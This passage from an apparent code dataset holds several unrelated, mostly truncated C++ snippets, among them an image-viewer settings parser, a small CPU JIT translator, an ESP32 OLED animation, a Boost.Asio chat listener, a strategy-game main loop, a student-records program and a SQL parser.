(Str.ToUpper(Args[0]) == L\"M_RAWPALETTECOUNT\")\n\t\t\t{\n\t\t\t\tm_RawPaletteCount = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_RAWPIXELPTR\")\n\t\t\t{\n\t\t\t\tm_RawPixelPtr = std::stoull(Args[1], nullptr, 16);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_RAWPALETTEPTR\")\n\t\t\t{\n\t\t\t\tm_RawPalettePtr = std::stoull(Args[1], nullptr, 16);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_RAWPIXELFILENAME\")\n\t\t\t{\n\t\t\t\tm_RawPixelFilename = Args[1];\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_RAWPALETTEFILENAME\")\n\t\t\t{\n\t\t\t\tm_RawPaletteFilename = Args[1];\n\t\t\t}\n\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_BISTREAMWIDTH\")\n\t\t\t{\n\t\t\t\tm_BistreamWidth = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_BISTREAMHEIGHT\")\n\t\t\t{\n\t\t\t\tm_BistreamHeight = std::stoi(Args[1]);\n\t\t\t}\n\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_IMAGEZOOM\")\n\t\t\t{\n\t\t\t\tm_ImageZoom = std::stof(Args[1]);\n\t\t\t\tm_ImageZoom = std::clamp(m_ImageZoom, m_ImageZoomMin, m_ImageZoomMax);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_DITHERING\")\n\t\t\t{\n\t\t\t\tb_Dithering = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"M_FILTERING\")\n\t\t\t{\n\t\t\t\tm_TextureFilter = (D3DTEXTUREFILTERTYPE)std::stoi(Args[1]);\n\n\t\t\t\tstd::uintmax_t iTextureFilterType = m_TextureFilter;\n\t\t\t\tiTextureFilterType = std::clamp(iTextureFilterType, 0ULL, 3ULL);\n\t\t\t\tm_TextureFilter = (D3DTEXTUREFILTERTYPE)iTextureFilterType;\n\t\t\t}\n\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_VIEWTOOLBAR\")\n\t\t\t{\n\t\t\t\tb_ViewToolbar = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_VIEWSTATUSBAR\")\n\t\t\t{\n\t\t\t\tb_ViewStatusbar = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_VIEWWINDOWOPTIONS\")\n\t\t\t{\n\t\t\t\tb_ViewWindowOptions = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_VIEWBITSTREAMOPTIONS\")\n\t\t\t{\n\t\t\t\tb_ViewBitstreamOptions = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_VIEWFILEWINDOW\")\n\t\t\t{\n\t\t\t\tb_ViewFileWindow = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_VIEWPALETTEWINDOW\")\n\t\t\t{\n\t\t\t\tb_ViewPaletteWindow = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_VIEWIMAGEOPTIONS\")\n\t\t\t{\n\t\t\t\tb_ViewImageOptions = std::stoi(Args[1]);\n\t\t\t}\n\t\t\tif (Str.ToUpper(Args[0]) == L\"B_VIEWVRAMWINDOW\")\n\t\t\t{\n\t\t\t\tb_View",
    "\n#include \"Person.h\"\nusing std::endl;\n\n// Constructor\nPerson::Person(const string &name) : m_name(name) {}\n\n// Getters and setters\nstring Person::getName() const {\n    return m_name;\n}\n\nconst SortedList<Task>& Person::getTasks() const {\n    return m_tasks;\n}\n\nvoid Person::setTasks(const SortedList<Task>& tasks) {\n    m_tasks = tasks;\n}\n\n// Other methods\nvoid Person::assignTask(const Task& task) {\n    m_tasks.insert(task);\n}\n\n\nint Person::completeTask() {\n    if (m_tasks.length() == 0) {\n        throw std::runtime_error(\"No tasks assigned to this person.\");\n    }\n    int taskId = (*m_tasks.begin()).getId();\n    m_tasks.remove(m_tasks.begin());\n    return taskId;\n}\n\nconst Task& Person::getHighestPriorityTask() const {\n    if (m_tasks.length() == 0) {\n        throw std::runtime_error(\"No tasks assigned to this person.\");\n    }\n    return (*m_tasks.begin());\n}\n\n// Overloaded operators\nostream& operator<<(ostream& os, const Person& person) {\n    os << \"Person: \" << person.m_name << endl;\n    // Assuming the SortedList has an appropriate method to list tasks\n    for (const Task& t: person.m_tasks) {\n        os << t << endl;\n    }\n    return os;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"testapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"core.h\"\n#include \"iss/tcc/vm_base.h\"\n#include <cstddef>\n#include <cstdint>\n#include <tuple>\n#include <vm.h>\n\nusing namespace iss::tcc;\nextern \"C\" {\nvoid print_eve_out(void *iface, int port, int val) {\n  CPPLOG(INFO) << \"[EXEC] I/O Port \" << port << \" sent: \" << val;\n}\n}\ndebugger::target_adapter_if *\neve_vm::accquire_target_adapter(debugger::server_if *srv) {\n  return nullptr;\n};\neve_vm::eve_vm()\n    : vm_base<eve_core>(std::make_unique<eve_core>(), 0, 0),\n      local_decoder([]() {\n        return std::vector<generic_instruction_descriptor>(\n            eve_instr_info.begin(), eve_instr_info.end());\n      }()){};\nvoid eve_vm::add_prologue(tu_builder &tu) {\n  std::ostringstream os;\n  os << \"void (*print_eve_out)(void*, int, int)=\" << (uintptr_t)&print_eve_out\n     << \";\\n\";\n  tu.add_prologue(os.str());\n}\ncontinuation_e eve_vm::gen_single_inst_behavior(virt_addr_t &pc_v,\n                                                tu_builder &tu) {\n  uint8_t opcode;\n  auto read_succ = core.read(address_type::PHYSICAL, access_type::FETCH,\n                             mem_type_e::IMEM, pc_v.val, 1, &opcode);\n  assert(read_succ == iss::Ok);\n  auto instr_index = local_decoder.decode_instr(opcode);\n  auto return_val = continuation_e::ILLEGAL_INSTR;\n  switch (instr_index) {\n  case op::MOV: {\n    uint8_t regS = bit_sub<3, 3>(opcode);\n    uint8_t regD = bit_sub<0, 3>(opcode);\n    tu(\"//MOV\");\n    tu.store(regD, tu.load(regS, 0));\n    pc_v = pc_v + 1;\n    return_val = continuation_e::CONT;\n    break;\n  }\n  case op::LD: {\n    tu(\"//LD\");\n    std::array<uint8_t, 2> msb_lsb;\n    auto read_succ =\n        core.read(address_type::PHYSICAL, access_type::FETCH, mem_type_e::IMEM,\n                  pc_v.val + 1, 2, msb_lsb.data());\n    assert(read_succ == iss::Ok);\n    uint8_t regD = bit_sub<0, 3>(opcode);\n    tu.store(regD, tu.read_mem(mem_type_e::DMEM,\n                               (msb_lsb.at(0) << 8) | msb_lsb.at(1), 8));\n    pc_v = pc_v + 3;\n    return_val = continuation_e::CONT;\n    break;\n  }\n  case op::ST: {\n    tu(\"//ST\");\n    std::array<uint8_t, 2> msb_lsb;\n    auto read_succ =\n        core.read(address_type::PHYSICAL, access_type::FETCH, mem_type_e::IMEM,\n                  pc_v.val + 1, 2, msb_lsb.data());\n    assert(read_succ == iss::Ok);\n    uint8_t regS = bit_sub<0, 3>(opcode);\n    tu.write_mem(mem_type_e::DMEM, (msb_lsb.at(0) << 8) | msb_lsb.at(1),\n                 tu.load(regS, 0));\n    pc_v = pc_v + 3;\n    return_val = continuation_e::CONT;\n    break;\n  }\n  case op::MOVI: {\n    tu(\"//MOVI\");\n    uint8_t imm = 0;\n    auto read_succ =\n        core.read(address_type::PHYSICAL, access_type::FETCH, mem_type_e::IMEM,\n                  pc_v.val + 1, 1, reinterpret_cast<uint8_t *>(&imm));\n    assert(read_succ == iss::Ok);\n    uint8_t reg = bit_sub<0, 3>(opcode);\n    tu.store(reg, imm);\n    pc_v = pc_v + 2;\n    return_val = continuation_e::CONT;\n    break;\n  }\n  case op::ADD: {\n    tu(\"//ADD\");\n    // uint16_t res =\n    //     static_cast<uint16_t>(core.reg.A) + static_cast<uint16_t>(core.reg.B);\n    // bool CY = res > 0xFF;\n    // bool SN = (res & 0x80) != 0;\n    // bool ZE = (res == 0);\n    // bool OV =\n    //     ((static_cast<int8_t>(core.reg.A) > 0 &&\n    //       static_cast<int8_t>(core.reg.B) > 0 &&\n    //       static_cast<int8_t>(res) < 0) ||\n    //      (static_cast<int8_t>(core.reg.A) < 0 &&\n    //       static_cast<int8_t>(core.reg.B) < 0 && static_cast<int8_t>(res) > 0));\n\n    // core.reg.A = static_cast<uint8_t>(res);\n    // core.reg.CY = CY;\n    // core.reg.SN = SN;\n    // core.reg.ZE = ZE;\n    // core.reg.OV = OV;\n    tu.store(reg_e::A, tu.add(tu.load(reg_e::A, 0), tu.load(reg_e::B, 0)));\n    pc_v = pc_v + 1;\n    return_val = continuation_e::CONT;\n    break;\n  }\n  case op::NOP: {\n    tu(\"//NOP\");\n    pc_v = pc_v + 1;\n    return_val = continuation_e::CONT;\n    break;\n  }\n  case op::GOTOXY: {\n    tu(\"//GOTOXY\");\n    auto new_pc = tu.add(tu.shl(tu.load(reg_e::X, 0), tu.constant(8, 8)),\n                         tu.load(reg_e::Y, 0));\n    tu.open_if(tu.icmp(iss::tcc::ICmpInst::ICMP_NE, tu.constant(pc_v.val, 16),\n                       new_pc));\n    tu.store(reg_e::LAST_BRANCH,\n             static_cast<uint8_t>(last_branch_e::UNKNOWN_JUMP));\n    tu.open_else();\n    tu.store(reg_e::LAST_BRANCH,\n             static_cast<uint8_t>(last_branch_e::BRANCH_TO_SELF));\n    tu.close_scope();\n    tu.store(reg_e::NEXT_PC, new_pc);\n    return_val = continuation_e::BRANCH;\n    break;\n  }\n  case op::OUT: {\n    tu(\"//OUT\");\n    uint8_t dest = 0;\n    auto read_succ = core.read(address_type::PHYSICAL, access_type::FETCH,\n                               mem_type_e::IMEM, pc_v.val + 1, 1, &dest);\n    assert(read_succ == iss::Ok);\n    tu(\"print_eve_out(core_ptr, {} , {});\", dest, tu.load(reg_e::A, 0));\n    pc_v = pc_v + 2;\n    return_val = continuation_e::CONT;\n    break;\n  }\n  default: {\n    CPPLOG(ERR) << \"Illegal Instruction found when jitting, exiting\";\n    this->core.exit_code = 1;\n    return_val = continuation_e::ILLEGAL_INSTR;\n",
    "/*********\n  Rui Santos\n  Complete project details at https://randomnerdtutorials.com\n*********/\n\n#include <Wire.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n\n#define MAIN_TAG \"main\"\n\n#define SCREEN_WIDTH 128 // OLED display width, in pixels\n#define SCREEN_HEIGHT 64 // OLED display height, in pixels\n\n#define I2C_Freq 100000\n\n#define SDA_0 21\n#define SCL_0 22\n\nTwoWire I2C_0 = TwoWire(0);\n\n// Declaration for an SSD1306 display connected to I2C (SDA, SCL pins)\nAdafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &I2C_0, -1);\n\nvoid setup() {\n  I2C_0.begin(SDA_0, SCL_0, I2C_Freq);\n\n  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { // Address 0x3D for 128x64\n    ESP_LOGE(MAIN_TAG, \"SSD1306 allocation failed\");\n    for (;;);\n  }\n  display.clearDisplay();\n}\n\nbool drawRadar(unsigned long now);\n\nbool drawMe(unsigned long now);\n\nbool drawEnemy(unsigned long now);\n\nvoid loop() {\n  unsigned long now = millis();\n\n  auto renderRadar = drawRadar(now);\n  auto renderMe = drawMe(now);\n  auto renderEnemy = drawEnemy(now);\n  if (renderRadar || renderMe || renderEnemy) {\n    display.display();\n  }\n}\n\nconstexpr auto CenterX = (SCREEN_WIDTH * 1 / 8) - 1;\nconstexpr auto CenterY = (SCREEN_HEIGHT / 2) - 1;\nint radarStep{};\nunsigned long lastRadarChecked{};\n\nbool drawRadar(unsigned long now) {\n  if (now - lastRadarChecked > 300) {\n    lastRadarChecked = now;\n    display.drawCircle(CenterX, CenterY, 3 + radarStep * 3, BLACK);\n    radarStep = ((++radarStep) % 32) + 2;\n    display.drawCircle(CenterX, CenterY, 3 + radarStep * 3, WHITE);\n    return true;\n  }\n  return false;\n}\n\nbool showMe{};\nunsigned long lastMeChecked{};\n\nbool drawMe(unsigned long now) {\n  if (now - lastMeChecked > 800) {\n    lastMeChecked = now;\n    display.fillCircle(CenterX, CenterY, 3, showMe ? WHITE : BLACK);\n    showMe = !showMe;\n    return true;\n  }\n  return false;\n}\n\nbool showEnemy{};\nunsigned long lastEnemyChecked{};\n\nbool drawEnemy(unsigned long now) {\n  if (now - lastEnemyChecked > 800) {\n    lastEnemyChecked = now;\n    showEnemy = random(0, 3) == 1;\n    display.fillCircle(CenterX, CenterY, 3, showEnemy ? WHITE : BLACK);\n    showEnemy = !showEnemy;\n    return true;\n  }\n  return false;\n}",
    "//\n// Copyright (c) 2023 Ruben Perez Hidalgo (rubenperez038 at gmail dot com)\n//\n// Distributed under the Boost Software License, Version 1.0. (See accompanying\n// file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)\n//\n\n#include \"listener.hpp\"\n\n#include <boost/asio/any_io_executor.hpp>\n#include <boost/asio/ip/tcp.hpp>\n#include <boost/asio/spawn.hpp>\n#include <boost/assert/source_location.hpp>\n\n#include <memory>\n\n#include \"error.hpp\"\n#include \"http_session.hpp\"\n#include \"services/mysql_client.hpp\"\n#include \"shared_state.hpp\"\n\nusing namespace chat;\n\n// An exception handler for coroutines that rethrows any exception thrown by\n// the coroutine. We handle all known error cases with error_code's. If an\n// exception is raised, it's something critical, e.g. out of memory.\n// Re-raising it in the exception handler will case io_context::run()\n// to throw and terminate the program.\nstatic constexpr auto rethrow_handler = [](std::exception_ptr ex) {\n    if (ex)\n        std::rethrow_exception(ex);\n};\n\n// The actual accept loop, coroutine-based\nstatic void accept_loop(\n    boost::asio::ip::tcp::acceptor acceptor,\n    std::shared_ptr<chat::shared_state> st,\n    boost::asio::yield_context yield\n)\n{\n    error_code ec;\n\n    // Run DB setup code. If this fails is because something really bad happened\n    // (e.g. the SQL execution failed), so we throw an exception. Network errors\n    // are handled by setup_db.\n    auto err = st->mysql().setup_db(yield);\n    if (err.ec)\n        throw_exception_from_error(err, BOOST_CURRENT_LOCATION);\n\n    // We accept connections in an infinite loop. When the io_context is stopped,\n    // coroutines are \"cancelled\" by throwing an internal exception, exiting\n    // the loop.\n    while (true)\n    {\n        // Accept a new connection\n        auto sock = acceptor.async_accept(yield[ec]);\n        if (ec)\n            return chat::log_error(ec, \"accept\");\n\n        // Launch a new session for this connection. Each session gets its\n        // own stackful coroutine, so we can get back to listening for new connections.\n        boost::asio::spawn(\n            sock.get_executor(),\n            [state = st, socket = std::move(sock)](boost::asio::yield_context yield) mutable {\n                run_http_session(std::move(socket), std::move(state), yield);   //\u91cd\u70b9\u51fd\u6570\n            },\n            rethrow_handler  // Propagate exceptions to the io_context\n        );\n    }\n}\n\nerror_code chat::launch_http_listener(\n    boost::asio::any_io_executor ex,\n    boost::asio::ip::tcp::endpoint listening_endpoint,\n    std::shared_ptr<shared_state> state\n)\n{\n    error_code ec;\n\n    // An object that allows us to acept incoming TCP connections\n    boost::asio::ip::tcp::acceptor acceptor{ex};\n\n    // Open the acceptor\n    acceptor.open(listening_endpoint.protocol(), ec);\n    if (ec)\n        return ec;\n\n    // Allow address reuse\n    acceptor.set_option(boost::asio::socket_base::reuse_address(true), ec);\n    if (ec)\n        return ec;\n\n    // Bind to the server address\n    acceptor.bind(listening_endpoint, ec);\n    if (ec)\n        return ec;\n\n    // Start listening for connections\n    acceptor.listen(boost::asio::socket_base::max_listen_connections, ec);\n    if (ec)\n        return ec;\n\n    // Spawn a coroutine that will accept the connections. From this point,\n    // everything is handled asynchronously, with stackful coroutines.\n    boost::asio::spawn(\n        std::move(ex),\n        [acceptor = std::move(acceptor), st = std::move(state)](boost::asio::yield_context yield) mutable {\n            accept_loop(std::move(acceptor), std::move(st), yield);\n        },\n        rethrow_handler  // Propagate exceptions to the io_context\n    );\n\n    return error_code();\n}\n",
    "#include <filesystem>\n#include <fstream>\n#include <vector>\n\n#include \"gamestate.hpp\"\n#include \"player.hpp\"\n#include \"playerAI.hpp\"\n#include \"tile.hpp\"\n#include \"ui.hpp\"\n#include \"ui/mainmenu.hpp\"\n#include \"ui/mapeditor.hpp\"\n#include \"ui/victory_screen.hpp\"\n#include \"uimanager.hpp\"\n\n// constants for map moved to uimanager.hpp\n\n// TODO should later be moved to a utils.cpp folder or sth\nstd::string readFileToString(const std::string& filename);\n\nint main() {\n  auto window = std::make_shared<sf::RenderWindow>(sf::VideoMode(1280, 1024),\n                                                   \"Strategy-8\");\n  window->setFramerateLimit(144);\n\n  std::shared_ptr<GameState> gs = std::make_shared<GameState>(window);\n  UIManager uiManager = UIManager();\n  //!!!TEMP  modified player Colors: (just so you can see that the tile is\n  //! highlighted)\n  std::shared_ptr<Player> player1 =\n      std::make_shared<Player>(sf::Color(0, 128, 128), 1);\n  // std::shared_ptr<PlayerAI> player1 =\n  // std::make_shared<PlayerAI>(sf::Color(0,128,128), 1, gs);\n\n  std::shared_ptr<PlayerAI> player2 =\n      std::make_shared<PlayerAI>(sf::Color(0, 0, 128), 2, gs);\n\n  // player1->addSharedPtr(player1);\n  player2->addSharedPtr(player2);\n\n  gs->addPlayer(player1);\n  gs->addPlayer(player2);\n\n  // create the map\n  std::string filename = \"maps/example1.txt\";\n  std::string fileContent = readFileToString(filename);\n\n  // for debugging purposes, map file has to be in /build/maps/map_file_name.txt\n  // you can also edit the map file directly in the build directory and won't\n  // need to rebuild the game\n  std::filesystem::path fullPath = std::filesystem::absolute(filename);\n  std::cout << \"Accessing file: \" << fullPath << std::endl;\n\n  gs->loadMapFromString(fileContent, NUM_OF_ROWS);\n\n  // claim some test tiles\n  gs->claimTile(4, 4, player1);\n  gs->claimTile(3, 4, player1);\n  gs->claimTile(5, 4, player1);\n  gs->claimTile(4, 3, player1);\n  gs->claimTile(4, 5, player1);\n\n  gs->claimTile(18, 15, player2);\n  gs->claimTile(17, 15, player2);\n  gs->claimTile(19, 15, player2);\n  gs->claimTile(18, 14, player2);\n  gs->claimTile(18, 16, player2);\n\n  // gs->claimTile(5, 5, player2);\n  // gs->claimTile(6, 7, player1);\n  // gs->claimTile(8, 8, player2);\n\n  // place some test Townhalls\n  TownHall townhall1(1, 1, player1, 4, 4);\n  TownHall townhall2(2, 1, player2, 18, 15);\n  gs->addTownhall(townhall1);\n  gs->addTownhall(townhall2);\n\n  // place some test armies\n  gs->addArmy(ARTILLERY, 1, 1, player1, 4);\n  gs->addArmy(CAVALRY, 1, 2, player2, 100);\n  // gs->addArmy(CAVALRY, 1, 1, player1, 300);\n  gs->addArmy(CAVALRY, 17, 14, player1, 300);\n  // gs->addArmy(6, 6, player1, 3);\n  // gs->addArmy(7, 6, player1, 2);\n  // gs->addArmy(5, 7, player1, 12);\n  // gs->addArmy(8, 7, player1, 9);\n  // gs->addArmy(11, 6, player1, 14);\n  // gs->addArmy(13, 6, player1, 25);\n  // gs->addArmy(6, 11, player1, 1);\n  // gs->addArmy(6, 12, player1, 1);\n  // gs->addArmy(0, 0, player1, 4);\n  // gs->addArmy(7, 11, player2, 1);\n  // gs->addArmy(7, 12, player2, 1);\n  // gs->addArmy(6, 7, player2, 4);\n  // gs->addArmy(8, 8, player2, 7);\n  // gs->addArmy(12, 6, player2, 14);\n  // gs->addArmy(14, 6, player2, 128);\n  // gs->addArmy(20, 19, player2, 4);\n\n  // move test armies\n  // Army& army1_1 = gs->getArmyByLocation(6, 6);\n  // gs->moveArmy(army1_1, 7, 6);\n  // Army& army1_3 = gs->getArmyByLocation(5, 7);\n  // gs->moveArmy(army1_3, 6, 7);\n  // Army& army2_2 = gs->getArmyByLocation(8, 8);\n  // gs->moveArmy(army2_2, 8, 7);\n  // Army& army1_5 = gs->getArmyByLocation(11, 6);\n  // gs->moveArmy(army1_5, 12, 6);\n  // Army& army2_4 = gs->getArmyByLocation(14, 6);\n  // gs->moveArmy(army2_4, 13, 6);\n\n  sf::Font f;\n  if (!f.loadFromFile(\"HackNerdFont-Regular.ttf\")) {\n    std::cerr << \"Error loading font!\" << std::endl;\n  }\n\n  MainMenu mainmenu = MainMenu(uiManager, f, window);\n\n  MapEditor mapeditor = MapEditor(uiManager, f, window);\n\n  UI player1ui = UI(player1, gs, f, window);\n  UI player2ui = UI(player2, gs, f, window);\n\n  VictoryScreen victoryScreen(uiManager, f, window, gs);\n\n  gs->setActivePlayerID(player2->getID());\n\n  while (window->isOpen()) {\n    int currentPlayerID = gs->getActivePlayerID();\n    UIState uiState = uiManager.getState();\n\n    for (auto event = sf::Event(); window->pollEvent(event);) {\n      if (event.type == sf::Event::Closed) {\n        window->close();\n      }\n      if (event.type == sf::Event::MouseButtonPressed) {\n        if (uiState == MAINMENU) {\n          mainmenu.processMouseButtonPressed(event);\n        } else if (uiState == GAME) {\n          if (player1->getID() == currentPlayerID)\n            player1ui.processMouseButtonPressed(event);\n\n          else if (player2->getID() == currentPlayerID)\n            player2ui.processMouseButtonPressed(event);\n\n          // if we have more than 2 players, we can expand here ..\n        } else if (uiState == VICTORY) {\n          victoryScreen.processMouseButtonPressed(event);\n        } else if (uiState == MAPEDITOR) {\n          mapeditor.processMous",
    "#include <iostream>\n#include <string>\n#include <fstream>\nusing namespace std;\nstruct StudentData\n{\n    int id;\n    string name;\n    int age;\n    string date_of_birth;\n    string address;\n    string phone_number;\n    string email;\n    string cnic;\n    string roll_number;\n    string blood_group;\n    double gpa;\n    string degree;\n    string joining_session;\n    string courses[5];\n    string scholarship;\n    string academic_standing;\n    string medical_conditions;\n    bool is_fee_paid;\n    string financial_status;\n    string emergency_contact;\n};\n\nconst int MAX_STUDENTS_SIZE = 2;\nStudentData students[MAX_STUDENTS_SIZE];\nint student_count = 0;\n\nbool isIDUnique(int id)\n{\n    for (int i = 0; i < student_count; i++)\n    {\n        if (students[i].id == id)\n            return false;\n    }\n    return true;\n}\n\nbool isRollNumberUnique(const string &rollnumber)\n{\n    for (int i = 0; i < student_count; i++)\n    {\n        if (students[i].roll_number == rollnumber)\n            return false;\n    }\n    return true;\n}\n\nbool isEmailUnique(const string &email)\n{\n    for (int i = 0; i < student_count; i++)\n    {\n        if (students[i].email == email)\n            return false;\n    }\n    return true;\n}\n\nvoid saveToFile()\n{\n    ofstream file(\"students.txt\");\n    if (file.is_open())\n    {\n        file << student_count << endl;\n        for (int i = 0; i < student_count; i++)\n        {\n            file << students[i].id << endl\n                 << students[i].name << endl\n                 << students[i].age << endl\n                 << students[i].date_of_birth << endl\n                 << students[i].address << endl\n                 << students[i].phone_number << endl\n                 << students[i].email << endl\n                 << students[i].cnic << endl\n                 << students[i].roll_number << endl\n                 << students[i].blood_group << endl\n                 << students[i].gpa << endl\n                 << students[i].degree << endl\n                 << students[i].joining_session << endl;\n\n            for (int j = 0; j < 5; j++)\n            {\n                file << students[i].courses[j] << endl;\n            }\n\n            file << students[i].scholarship << endl\n                 << students[i].academic_standing << endl\n                 << students[i].medical_conditions << endl\n                 << students[i].is_fee_paid << endl\n                 << students[i].financial_status << endl\n                 << students[i].emergency_contact << endl;\n        }\n        file.close();\n    }\n    else\n    {\n        cout << \"Error saving data!\" << endl;\n    }\n}\n\nvoid loadFromFile()\n{\n    ifstream file(\"students.txt\");\n    if (file.is_open())\n    {\n        file >> student_count;\n        file.ignore();\n        for (int i = 0; i < student_count; i++)\n        {\n            file >> students[i].id;\n            file.ignore();\n            getline(file, students[i].name);\n            file >> students[i].age;\n            file.ignore();\n            getline(file, students[i].date_of_birth);\n            getline(file, students[i].address);\n            getline(file, students[i].phone_number);\n            getline(file, students[i].email);\n            getline(file, students[i].cnic);\n            getline(file, students[i].roll_number);\n            getline(file, students[i].blood_group);\n            file >> students[i].gpa;\n            file.ignore();\n            getline(file, students[i].degree);\n            getline(file, students[i].joining_session);\n\n            for (int j = 0; j < 5; j++)\n            {\n                getline(file, students[i].courses[j]);\n            }\n\n            getline(file, students[i].scholarship);\n            getline(file, students[i].academic_standing);\n            getline(file, students[i].medical_conditions);\n            file >> students[i].is_fee_paid;\n            file.ignore();\n            getline(file, students[i].financial_status);\n            getline(file, students[i].emergency_contact);\n        }\n        file.close();\n    }\n    else\n    {\n        cout << \"No data found. Starting fresh!\" << endl;\n    }\n}\n\nvoid addStudents()\n{\n    StudentData student;\n\n    cout << \"\\nEnter Student Data!\\n\";\n    cout << \"\\nPersonal Information\\n\";\n    cout << \"Enter ID(only numbers allowed!): \";\n    cin >> student.id;\n    if (isIDUnique(student.id) == false)\n    {\n        cout << \"ID already Exists\";\n        return;\n    }\n    cout << \"Enter Student Name: \";\n    cin.ignore();\n    getline(cin, student.name);\n    cout << \"Enter Age: \";\n    cin >> student.age;\n    if (student.age <= 0)\n    {\n        cout << \"Negative or 0 is not allowed!\\n\";\n        cout << \"Enter Again!\\n\";\n        return;\n    }\n    cout << \"Enter Date of Birth: \";\n    cin >> student.date_of_birth;\n    cout << \"Enter Address: \";\n    cin.ignore();\n    getline(cin, student.address);\n    cout << \"Enter Phone Number: \";\n    cin >> student.phone_number;\n    cout << \"Enter Email: \";\n    cin >> student.email;\n    if (isEmailUnique(student.email) == false)\n    {\n        cout << ",
    "//\n// Created by Snehasis Sheat on 03/01/25.\n//\n#include <iostream>\n#include <string>\n#include <vector>\n#include <memory>\n#include <stdexcept>\n\n\nusing namespace std;\n\nstruct FetchNode;\nstruct WhereNode;\nstruct GroupByNode;\nstruct HavingNode;\nstruct OrderByNode;\nstruct ExpressionNode;\n\nenum class OrderDirection {\n    ASC,\n    DESC,\n};\nenum class ComparisonOp {\n    EQ,\n    NEQ,\n    LT,\n    GT,\n    LTE,\n    GTE,\n    IN,\n    LIKE\n};\nstruct Astnode {\n    virtual ~Astnode() = default;\n};\n\nstruct ExpressionNode : Astnode {\n    enum class Type {\n        COLUMN,\n        OPERATOR,\n        LITERAL,\n\n    };\n    Type type;\n    string value;\n    vector<unique_ptr<ExpressionNode>> arguments;\n\n    ExpressionNode(Type t, const string& val):type(t),value(val){};\n};\n\nstruct FetchNode :Astnode {\n    vector<unique_ptr<ExpressionNode>> fetchList;\n    unique_ptr<WhereNode> whereClause;\n    unique_ptr<GroupByNode> groupByClause;\n    unique_ptr<HavingNode> havingClause;\n    unique_ptr<OrderByNode> orderByClause;\n\n};\n\nstruct WhereNode : Astnode {\n    unique_ptr<ExpressionNode> condition;\n};\n\nstruct GroupByNode : Astnode {\n    vector<unique_ptr<ExpressionNode>> columns;\n};\n\nstruct HavingNode : Astnode {\n    unique_ptr<ExpressionNode> condition;\n\n};\n\nstruct OrderByNode : Astnode {\n    struct OrderElement {\n        unique_ptr<ExpressionNode> expression;\n        OrderDirection direction;\n    };\n    vector<OrderElement> elements;\n\n};\n\nclass Parser {\n        vector<string>::const_iterator currentToken;\n        vector<string>::const_iterator end;\n\n        string current() const {\n            return currentToken != end ? *currentToken : \"\";\n        }\n\n        void advance() {\n            if (currentToken != end)\n                ++currentToken;\n        }\n\n        bool match(const string& expected) {\n            if (current() == expected) {\n                advance();\n                return true;\n            }\n            return false;\n        }\n\n   public:\n        Parser(const vector<string>& tokens) {\n            currentToken = tokens.begin();\n            end = tokens.end();\n        }\n\n        unique_ptr<FetchNode> parseSelect() {\n            auto fetchNode = make_unique<FetchNode>();\n\n            if (!match(\"SELECT\")) {\n                throw runtime_error(\"Expected 'SELECT'\");\n            }\n\n            do {\n                fetchNode->fetchList.push_back(parseExpression());\n            }while (match(\",\"));\n\n            if (!match(\"FROM\")) {\n                throw runtime_error(\"Expected 'FROM'\");\n            }\n\n            if (match(\"WHERE\")) {\n                fetchNode->whereClause = make_unique<WhereNode>();\n                fetchNode->whereClause->condition = parseExpression();\n            }\n            if (match(\"GROUP\")) {\n                if (!match(\"BY\")) {\n                    throw runtime_error(\"Expected BY after GROUP\");\n                }\n                fetchNode->groupByClause = make_unique<GroupByNode>();\n            }\n            if (match(\"ORDER\")) {\n                if (!match(\"BY\")) {\n                    throw runtime_error(\"Expected BY after ORDER\");\n                }\n                fetchNode->orderByClause = parseOrderBy();\n            }\n            return fetchNode;\n\n        }\n    private:\n        unique_ptr<ExpressionNode> parseExpression() {\n            string value = current();\n            advance();\n            return make_unique<ExpressionNode>(ExpressionNode::Type::COLUMN, 